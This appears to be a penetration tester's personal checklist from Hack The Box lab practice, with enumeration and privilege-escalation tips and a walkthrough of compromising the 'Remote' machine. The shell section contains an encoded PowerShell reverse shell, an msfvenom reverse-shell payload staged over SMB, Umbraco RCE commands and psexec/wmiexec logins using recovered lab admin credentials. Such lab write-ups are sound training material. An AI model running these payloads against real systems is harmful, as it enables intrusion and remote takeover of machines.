This is an unofficial checklist that I am preparing while solving Labs and HTB Machines. The checklist is not yet sorted but will eventually sort out this as I progress.

### Index
1.  Initial Enumeration Checklist
2.  Privilege Escalation Checklist
3.  CURL
4.  Ways to Get the Shell Worked 

### Initial Enumeration

- [ ] Run the Nmap command in this order: `nmap -p- --min-rate=1000 -Pn -T4 -sC -sV <IP>`
- [ ] If there's a Web Application Involved, Use Burp and Wappalyzer to identify framework. Find Relative vulnerabilities on Exploit-DB, GitHub Poc.
### Privilege Escalation

- [ ] Run winPEAS.bat on CMD and if you can access the PowerShell, run winPEAS.ps1. The PowerShell one has a color output with little extra details. Prefer ps1 over bat.
- [ ] Some of the Important Paths to check during Privilege Escalation
	- [ ] Check C:\\Users\\[UserName]\\**AppData Local** and **AppData Roaming** Directory.
	- [ ] Another Import Path to check C:\\ProgramData and C:\\Users\\Public

### CURL 

To Download the file on the target.
```
Start the Python Server on Kali
python -m http.server 80

Run the following Command in Windows if Curl is Installed
curl -o FileName http://Kali_IP/FileName
```

### Ways to Get The Shell

#### RCE to Shell

During the Remote.htb, I had the following scenario.
```
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c whoami
iis apppool\defaultapppool
```

#### Getting Shell When you have password

Getting Shell from RCE was achieved as follows
```
## Failed Attempt of using powershell

python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-e JExIT1NUID0gIjEwLjEwLjE2LjUiOyAkTFBPUlQgPSA0NDQ0OyAkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJExIT1NULCAkTFBPUlQpOyAkTmV0d29ya1N0cmVhbSA9ICRUQ1BDbGllbnQuR2V0U3RyZWFtKCk7ICRTdHJlYW1SZWFkZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlcigkTmV0d29ya1N0cmVhbSk7ICRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ICRTdHJlYW1Xcml0ZXIuQXV0b0ZsdXNoID0gJHRydWU7ICRCdWZmZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNDsgd2hpbGUgKCRUQ1BDbGllbnQuQ29ubmVjdGVkKSB7IHdoaWxlICgkTmV0d29ya1N0cmVhbS5EYXRhQXZhaWxhYmxlKSB7ICRSYXdEYXRhID0gJE5ldHdvcmtTdHJlYW0uUmVhZCgkQnVmZmVyLCAwLCAkQnVmZmVyLkxlbmd0aCk7ICRDb2RlID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRSYXdEYXRhIC0xKSB9OyBpZiAoJFRDUENsaWVudC5Db25uZWN0ZWQgLWFuZCAkQ29kZS5MZW5ndGggLWd0IDEpIHsgJE91dHB1dCA9IHRyeSB7IEludm9rZS1FeHByZXNzaW9uICgkQ29kZSkgMj4mMSB9IGNhdGNoIHsgJF8gfTsgJFN0cmVhbVdyaXRlci5Xcml0ZSgiJE91dHB1dGBuIik7ICRDb2RlID0gJG51bGwgfSB9OyAkVENQQ2xpZW50LkNsb3NlKCk7ICROZXR3b3JrU3RyZWFtLkNsb3NlKCk7ICRTdHJlYW1SZWFkZXIuQ2xvc2UoKTsgJFN0cmVhbVdyaXRlci5DbG9zZSgp'

## Successful Attempt
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe -o revshell.exe
$ impacket-smbserver a /home/ringbuffer/Downloads/Remote.htb -smb2support
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'net use \\10.10.14.4\a'
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'copy //10.10.14.4/a/revshell.exe C:/Windows/Temp/revshell.exe'
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'C:/Windows/Temp/revshell.exe' #Make sure the listener is On in another tab
```

During Privilege Escalation for the Remote.HTB, I got the Administrator Credentials but getting shell was something i spent my time on. So here are few ways to get a direct shell if you have a credentials.

Using `Impacket-psexec`

```
$ impacket-psexec 'Administrator:!R3m0te!@10.10.10.180' 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.180.....
[*] Found writable share ADMIN$
[*] Uploading file gZTCDlfJ.exe
[*] Opening SVCManager on 10.10.10.180.....
[*] Creating service xWJX on 10.10.10.180.....
[*] Starting service xWJX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Using `impacket-wmiexec`
```
$ impacket-wmiexec 'Administrator:!R3m0te!@10.10.10.180'                      
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
remote\administrator
```

Using `smbclient`
```
$ smbclient -U Administrator \\\\10.10.10.180\\C$
Password for [WORKGROUP\Administrator]:!R3m0te!    # Provide the Admin Password Here
```
